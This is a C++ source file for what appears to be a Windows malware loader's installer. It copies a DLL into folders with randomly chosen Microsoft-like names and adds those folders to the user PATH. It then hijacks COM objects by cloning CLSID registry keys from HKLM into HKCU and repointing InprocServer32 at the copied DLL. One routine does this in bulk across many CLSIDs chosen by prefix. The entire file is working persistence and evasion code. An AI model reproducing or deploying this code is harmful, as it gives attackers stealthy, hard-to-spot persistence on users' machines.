#include <Windows.h>
#include <string>
#include <shlwapi.h>
#include <time.h>
#include <random>
#include <set>
#include <fstream>
#include <filesystem>
#include <vector>
#include <stdio.h>
#include <process.h>
#include <optional>
#include <sstream>
#include "LoaderCore.h"


//Define two COMMON_NAMES because x32 and x64 will use the same PATH system.
//It is possible for the both version of the loader get the same random name. But it will not work on one platform.
#ifdef _WIN64
const char COMMON_NAMES[][512] = { "Thumbnail","Microsoft","Cache","Calculator","Clock","System","Theme","View","Framework","Windows" };
#else
const char COMMON_NAMES[][512] = { "History","Font","Cursor","Edit","Window","Color","Family","Mode","Session","Profile" };
#endif


void setSuitePath(std::string path) {
#ifdef _WIN64
	const char* reg_value = "SIO64";
#else
	const char* reg_value = "SIO32";
#endif

	RegSetKeyValueA(HKEY_CURRENT_USER, "Console", reg_value, REG_SZ, path.c_str(), path.size() + 1);
}

//Deletes all keys in Current user with Alternative key defined
void unistallSystem() {
	DWORD buffSize = 2048;
	HKEY currentKey;
	DWORD countSubkeys;

	if (RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Classes\\CLSID\\", &currentKey) != ERROR_SUCCESS) return;

	bool found = true;
	while (found) {
		found = false;

		if (RegQueryInfoKeyA(currentKey, NULL, NULL, NULL, &countSubkeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
			RegCloseKey(currentKey);
			return;
		}

		char subkeyCLSID[2048];
		for (DWORD i = 0; i < countSubkeys; i++) {
			if (RegEnumKeyA(currentKey, i, subkeyCLSID, 2048) != ERROR_SUCCESS) continue;

			std::string reg_path = std::string("Software\\Classes\\CLSID\\") + std::string(subkeyCLSID);
			std::string inProcServer_path = reg_path + std::string("\\InprocServer32");
			char dataValue[2048];
			DWORD buffSize = 2048;

			if (RegGetValueA(HKEY_CURRENT_USER, inProcServer_path.c_str(), "Alternative", RRF_RT_REG_SZ, NULL, dataValue, &buffSize) == ERROR_SUCCESS) {
				//I must loop again through all keys because I'm deleting one here
				//RegEnumKey will jump over a few keys if I delete in here

				RegDeleteTreeA(HKEY_CURRENT_USER, reg_path.c_str());
				found = true;
				break;
			}
		}
	}

	RegCloseKey(currentKey);
}

//Creates random folder in path(install_path must be slash terminated)
//Copies itself(current_loader_path) to newly created folder with random name
//Clones guid key from Local Machine\CLSID into Current User
//Modifies InprocServer32 to point to copy in path
//Adds Alternative value for safe-later retrieval
// If Guid is empty then the function will use hijackOtherCLSIDs function istead.
void installOnSystem(std::string install_path, std::string current_loader_path, std::string guid) {
	std::string fake_path;
	std::string fake_loader_name;
	std::string fake_loader_path;

	int i = 0;
	for (i = 0; i < 10; i++) {
		fake_path = install_path + generateRandomName(2 + (rand() % 3), ((rand() % 2) == 0 ? true : false)) + "\\";

		if (CreateDirectoryA(fake_path.c_str(), NULL) == 0) continue;
		break;
	}
	if (i == 10) return;		//Could not create a folder after some trials

	fake_loader_name = generateRandomName(2 + (rand() % 3), true);
	fake_loader_path = fake_path + fake_loader_name + ".dll";

	//We don't want collsions(altough not possible to have collsions..the folder is new and only one file stored per folder)
	//...set bFailsExists to true
	if (CopyFileA(current_loader_path.c_str(), fake_loader_path.c_str(), true) == 0) return;

	//Add folder path to PATH
	char path_cstr_value[2048];
	DWORD buffSize = 2048;

	if (RegGetValueA(HKEY_CURRENT_USER, "Environment", "Path", RRF_RT_REG_SZ, NULL, path_cstr_value, &buffSize) != ERROR_SUCCESS) {
		//Error meaning PATH does not exist
		if (RegSetKeyValueA(HKEY_CURRENT_USER, "Environment", "Path", REG_SZ, fake_path.c_str(), fake_path.size() + 1) != ERROR_SUCCESS) return;
	} else {
		std::string path_value = std::string(path_cstr_value);
		path_value = fake_path + ";" + path_value;		// Add the path at the beginning of the string so it is not the last added element; also fixes the ';' issue

		if (RegSetKeyValueA(HKEY_CURRENT_USER, "Environment", "Path", REG_SZ, path_value.c_str(), path_value.size() + 1) != ERROR_SUCCESS) return;
	}

	//Refresh changes in explorer
	DWORD_PTR sendResult;
	SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)"Environment", SMTO_NORMAL, 50, &sendResult);

	if (guid.size() != 0) hijackCLSID(guid, fake_loader_name);
	else hijackOtherCLSIDs(fake_loader_name);
}
std::optional<std::string> installOnSystem2(std::string install_path, std::string loader_name, std::string current_path) {
	std::string fake_path;
	std::string fake_loader_name;
	std::string fake_loader_path;
	bool found_loader = false;

	int i = 0;
	for (i = 0; i < 10; i++) {
		fake_path = install_path + generateRandomName(2 + (rand() % 3), ((rand() % 2) == 0 ? true : false)) + "\\";

		if (CreateDirectoryA(fake_path.c_str(), NULL) == 0) continue;
		break;
	}
	if (i == 10) return {};		//Could not create a folder after some trials

	// Set Suite path
	setSuitePath(fake_path);

	for (const auto& entry : std::filesystem::directory_iterator(current_path)) {
		if (!entry.path().has_filename() || !entry.path().has_extension()) continue;

		std::string file_path = entry.path().generic_u8string();
		std::string filename = entry.path().filename().generic_u8string();

		if (filename.find("_old") != std::string::npos || filename.find(".dll") == std::string::npos) continue;

		if (_strnicmp(filename.c_str(), loader_name.c_str(), filename.size() + 1) == 0) {
			// Special handling of loader
			found_loader = true;

			fake_loader_name = generateRandomName(2 + (rand() % 3), true);
			fake_loader_path = fake_path + fake_loader_name + ".dll";

			// bFailIfExists = False because we want to overwrite existing files
			if (CopyFileA(file_path.c_str(), fake_loader_path.c_str(), false) == 0) return {};

		} else {
			// All other components

			// bFailIfExists = False because we want to overwrite existing files
			CopyFileA(file_path.c_str(), (fake_path + filename).c_str(), false);
		}
	}

	// Do not continue if the loader was not copied
	if (!found_loader) return {};

	//Add folder path to PATH
	char path_cstr_value[1024];
	DWORD buffSize = sizeof(path_cstr_value);

	if (RegGetValueA(HKEY_CURRENT_USER, "Environment", "Path", RRF_RT_REG_SZ, NULL, path_cstr_value, &buffSize) != ERROR_SUCCESS) {
		//Error meaning PATH does not exist
		if (RegSetKeyValueA(HKEY_CURRENT_USER, "Environment", "Path", REG_SZ, fake_path.c_str(), fake_path.size() + 1) != ERROR_SUCCESS) {
			return {};
		}
	} else {
		std::stringstream path_value;
		path_value << fake_path.substr(0, fake_path.size() - 1) << ";" << path_cstr_value;// Add the path at the beginning of the string so it is not the last added element; also fixes the ';' issue

		// It is safe to directly call str().c_str() because although the value is temporary it is kept until end of expression
		// meaning end of the entire reg function call
		if (RegSetKeyValueA(HKEY_CURRENT_USER, "Environment", "Path", REG_SZ, path_value.str().c_str(), path_value.str().size() + 1) != ERROR_SUCCESS) {
			return {};
		}
	}

	//Refresh changes in explorer
	DWORD_PTR sendResult;
	SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)"Environment", SMTO_NORMAL, 50, &sendResult);

	return fake_loader_name;
}

//Checks if Alterntive value exists. If true exits.
//Delete already existing tree key.
//Copy tree from local machine to current user.
//Copy InprocServer32 default value to alternative
//Modify default value to redirect_filename.
void hijackCLSID(std::string guid, std::string redirect_filename) {
	std::string reg_path = std::string("Software\\Classes\\CLSID\\") + guid;
	std::string inProcServer_path = reg_path + std::string("\\InprocServer32");
	HKEY srcKey, dstKey;

	// Avoid if Alternative key already defined
	char dataValue[2048];
	DWORD buffSize = sizeof(dataValue);
	if (RegGetValueA(HKEY_CURRENT_USER, inProcServer_path.c_str(), "Alternative", RRF_RT_REG_SZ, NULL, dataValue, &buffSize) == ERROR_SUCCESS) {
		return;
	}

	// If key doesn't exist in current user then take it from local machine
	if (RegOpenKeyExA(HKEY_CURRENT_USER, reg_path.c_str(), 0, KEY_READ, &srcKey) != ERROR_SUCCESS) {
		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, reg_path.c_str(), 0, KEY_READ, &srcKey) == ERROR_SUCCESS) {
			if (RegCreateKeyA(HKEY_CURRENT_USER, reg_path.c_str(), &dstKey) == ERROR_SUCCESS) {
				// Copy entire tree
				SHCopyKeyA(srcKey, NULL, dstKey, 0);
				RegCloseKey(dstKey);
			}
			RegCloseKey(srcKey);
		}
	} else RegCloseKey(srcKey);


	if (RegOpenKeyExA(HKEY_CURRENT_USER, reg_path.c_str(), 0, KEY_READ, &dstKey) == ERROR_SUCCESS) {
		//Do the actual hijacking
		char original_dll_name[2048];
		buffSize = sizeof(original_dll_name);

		if (RegGetValueA(dstKey, "InProcServer32", "", RRF_RT_REG_SZ, NULL, original_dll_name, &buffSize) != ERROR_SUCCESS) {
			RegCloseKey(dstKey);
			return;
		}

		//Store original dll in Alternative
		//buffSize actually contains the exact data of buffer
		if (RegSetKeyValueA(dstKey, "InProcServer32", "Alternative", REG_SZ, (byte*)original_dll_name, buffSize) != ERROR_SUCCESS) {
			RegCloseKey(dstKey);
			return;
		}

		buffSize = redirect_filename.size() + 1;
		if (RegSetKeyValueA(dstKey, "InProcServer32", "", REG_SZ, (byte*)redirect_filename.c_str(), buffSize) != ERROR_SUCCESS) {
			RegCloseKey(dstKey);
			return;
		}

		RegCloseKey(dstKey);
	}
}

//Takes all clsid key in local machine using a filter
//Calls hijackCLSID with the provided redirect_filename
void hijackOtherCLSIDs(std::string redirect_filename) {
	DWORD buffSize = 2048;
	HKEY machineKey;
	DWORD countSubkeys;

	if (RegOpenKeyA(HKEY_LOCAL_MACHINE, "Software\\Classes\\CLSID\\", &machineKey) != ERROR_SUCCESS) return;

	if (RegQueryInfoKeyA(machineKey, NULL, NULL, NULL, &countSubkeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
		RegCloseKey(machineKey);
		return;
	}

	char subkeyCLSID[2048];
	for (DWORD i = 0; i < countSubkeys; i++) {

		if (RegEnumKeyA(machineKey, i, subkeyCLSID, 2048) != ERROR_SUCCESS) continue;

		//Filter
		if (!(strstr(subkeyCLSID, "{AB") == subkeyCLSID ||
			strstr(subkeyCLSID, "{E0") == subkeyCLSID ||
			strstr(subkeyCLSID, "{09") == subkeyCLSID ||
			strstr(subkeyCLSID, "{10") == subkeyCLSID ||
			strstr(subkeyCLSID, "{F0") == subkeyCLSID) ||
			strstr(subkeyCLSID, "{AF") == subkeyCLSID) continue;

		hijackCLSID(std::string(subkeyCLSID), redirect_filename);
	}

	RegCloseKey(machineKey);
}


std::string generateRandomName(int word_count, bool interspace) {
	std::string res;
	std::set<int> already_indexed;

	int common_names_count = (sizeof(COMMON_NAMES) / sizeof(COMMON_NAMES[0]));
	int rand_nr = rand() % common_names_count;
	already_indexed.insert(rand_nr);
	res = std::string(COMMON_NAMES[rand_nr]);

	for (int i = 1; i < word_count; i++) {
		int rand_nr = rand() % common_names_count;

		while (already_indexed.find(rand_nr) != already_indexed.end()) {
			rand_nr = rand() % common_names_count;
		}

		already_indexed.insert(rand_nr);
		res = res + (interspace ? " " : "") + std::string(COMMON_NAMES[rand_nr]);
	}

	return res;
}